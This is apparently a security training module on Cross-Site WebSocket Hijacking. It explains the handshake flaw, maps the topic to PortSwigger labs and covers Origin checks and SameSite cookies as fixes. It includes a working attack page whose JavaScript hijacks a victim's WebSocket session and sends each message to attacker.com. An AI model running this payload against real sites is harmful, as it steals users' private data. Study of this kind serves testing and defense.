# 05 — Cross-Site WebSocket Hijacking (CSWSH)

## Mechanism: The WebSocket Handshake Is an HTTP Request the SOP Doesn't Fully Protect

A WebSocket connection begins life as a regular HTTP `GET` request with an `Upgrade:
websocket` header, sent by the browser to establish what then becomes a persistent,
bidirectional connection. This initial handshake request is the entire vulnerability
surface for CSWSH, and the critical fact to understand is:

**The browser sends this handshake request cross-origin, automatically including
ambient credentials (cookies for the target domain), exactly like a normal cross-origin
form submission or image request — and unlike `fetch()`/`XMLHttpRequest`, there is no
preflight or CORS-style permission check involved.**

This means: if `victim.com` runs a WebSocket server, and a logged-in victim visits
`attacker.com`, JavaScript on `attacker.com` can open a WebSocket connection directly to
`wss://victim.com/chat`. The browser will include the victim's `victim.com` session
cookies in that handshake automatically, the same way it would for any other
cross-origin request to that domain. The Same-Origin Policy does not block this
connection attempt — it only would have prevented `attacker.com`'s JavaScript from
directly reading response data from a cross-origin `fetch()`. WebSockets work differently:
once the connection is open, the attacker's page has a live, bidirectional, full
read/write channel to `victim.com`, authenticated as the victim, regardless of which
origin initiated the connection.

The vulnerability exists specifically when **the server-side WebSocket handler does not
itself validate the `Origin` header** sent during the handshake. CORS headers and
preflight requests are an HTTP/`fetch()`-layer concept; WebSockets have their own
`Origin` header sent automatically by the browser, but it is entirely up to the
**server** to check it — nothing in the browser or WebSocket protocol enforces this for
you.

## The Vulnerable Handshake, Annotated

A browser opening a WebSocket sends a handshake request that includes:

```
GET /chat HTTP/1.1
Host: victim.com
Origin: https://attacker.com
Cookie: session=abc123
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: ...
Sec-WebSocket-Version: 13
```

- `Origin: https://attacker.com` — sent automatically by the browser, truthfully
  reflecting where the connecting script is actually running. This is the **one** signal
  the server has to make a trust decision — but only if its code actually inspects it.
- `Cookie: session=abc123` — the victim's real session cookie for `victim.com`, attached
  automatically because this is, from the browser's perspective, just a normal
  same-domain-target HTTP request; cookie attachment follows normal cookie-domain-matching
  rules, not Same-Origin Policy rules.
- If the server-side handler accepts this handshake and establishes the WebSocket without
  checking that `Origin` is an expected, trusted value, the resulting connection is fully
  authenticated as the victim, and the attacker's JavaScript now has a live channel to
  send and receive messages exactly as that user.

## Exploitation: Building the Attack Page

```html
<script>
  var ws = new WebSocket('wss://victim.com/chat');
  ws.onopen = function() {
    ws.send("READY");
  };
  ws.onmessage = function(event) {
    fetch('https://attacker.com/log?data=' + encodeURIComponent(event.data));
  };
</script>
```

Piece by piece:

- `new WebSocket('wss://victim.com/chat')` — initiates the handshake described above. The
  browser handles attaching `Origin` and `Cookie` headers automatically; the attacker's
  script does not need to (and cannot easily) forge either.
- `ws.onopen` — fires once the handshake succeeds and the connection is established. At
  this point, the attacker's script has a live, authenticated channel.
- `ws.send("READY")` — depending on the target application's protocol, this might be
  needed to trigger the server to start streaming data (e.g., a chat application that
  sends message history once the client signals readiness). The exact payload required
  here is application-specific and is discovered by inspecting the legitimate client's
  WebSocket traffic first.
- `ws.onmessage` — fires every time the server pushes a message over the now-open
  connection. Because the connection is authenticated as the victim, these messages can
  contain the victim's private data (chat history, account details, anything the
  application streams over this channel for an authenticated user).
- `fetch('https://attacker.com/log?data=' + encodeURIComponent(event.data))` — exfiltrates
  each received message back to an attacker-controlled server using a normal, unrelated
  HTTP request (this part has nothing to do with WebSockets — it's just how the stolen
  data gets out to the attacker).

If the application's WebSocket protocol also accepts **action-performing** messages (not
just passive data streams) — e.g., sending a chat message, changing account settings,
transferring funds — the same hijacked connection can be used to **send** forged messages
that the server processes as if they came from the legitimate, authenticated user,
turning this into a CSRF-equivalent attack over a persistent channel rather than a single
forged HTTP request.

## Why This Differs From a Normal CSRF Defense Story

Standard CSRF defenses (CSRF tokens embedded in forms, `SameSite=Strict`/`Lax` cookies)
are the first things to check when assessing whether CSWSH is actually exploitable on a
target:

- **CSRF tokens** only help if the WebSocket handshake or an early message exchange
  requires one and the server actually validates it — many implementations never extended
  their CSRF protections to cover the WebSocket endpoint, treating it as outside the scope
  of their standard CSRF middleware.
- **`SameSite` cookie attributes** are genuinely effective here: a `SameSite=Strict` or
  `SameSite=Lax` session cookie will not be attached to the cross-site WebSocket handshake
  initiated from `attacker.com`, which neutralizes the attack at the cookie layer
  regardless of server-side `Origin` validation. This is why `SameSite` cookie attributes
  are flagged as a primary, modern mitigation alongside explicit `Origin` checking.
- The **correct, complete fix** is still server-side `Origin` header validation against an
  explicit allowlist — `SameSite` cookies are a strong mitigating control but shouldn't be
  relied on as the sole defense, since some legitimate cross-origin WebSocket use cases or
  older browser/cookie configurations may not provide that protection.

## PortSwigger Web Security Academy Lab Mapping

All three labs live under the **WebSockets** topic. The first two are general
WebSocket-manipulation prerequisites (not CSWSH-specific), included here because the
Academy's own learning path treats them as necessary groundwork before the dedicated
CSWSH lab — understanding how to intercept, modify, and replay WebSocket traffic in Burp
is a precondition for testing CSWSH at all:

1. **Manipulating WebSocket messages to exploit vulnerabilities** (Apprentice) — general
   prerequisite: practice intercepting and editing individual WebSocket messages in Burp
   against a live-chat feature, establishing the baseline skill of treating WebSocket
   traffic as testable, not just "encrypted/opaque."
2. **Manipulating the WebSocket handshake to exploit vulnerabilities** (Practitioner) —
   general prerequisite: practice modifying handshake-time headers/cookies, which is the
   same Burp workflow (Proxy → WS history → Repeater) used to test `Origin` validation in
   the CSWSH lab itself.
3. **Cross-site WebSocket hijacking** (Practitioner) — the dedicated CSWSH lab: the
   target's live-chat WebSocket handler trusts the ambient session cookie without checking
   `Origin`, and the lab requires constructing an exploit-server-hosted page (matching the
   attack page structure above) that exfiltrates another user's chat history.

## Real-World Notes

- CSWSH is frequently under-tested in real engagements because WebSocket traffic doesn't
  show up in a standard authenticated crawl/spider the way normal HTTP endpoints do —
  testers need to actively use the application's real-time features (chat, live
  dashboards, notifications, collaborative editing) while proxying through Burp to capture
  the handshake and subsequent message traffic at all.
- Because the attack requires no special browser permissions or user interaction beyond
  "visit a page while logged into the target in another tab," CSWSH findings in bug bounty
  reports are typically rated high severity when the hijacked channel exposes sensitive
  data or allows state-changing actions — equivalent in practical impact to a CSRF finding
  on a particularly data-rich endpoint.
- Modern frameworks that scaffold WebSocket support (e.g., Socket.IO, SignalR, Action
  Cable) vary in whether they perform origin validation by default — this should always be
  verified against the specific framework/version in use rather than assumed, since
  default-secure behavior is not consistent across the ecosystem.
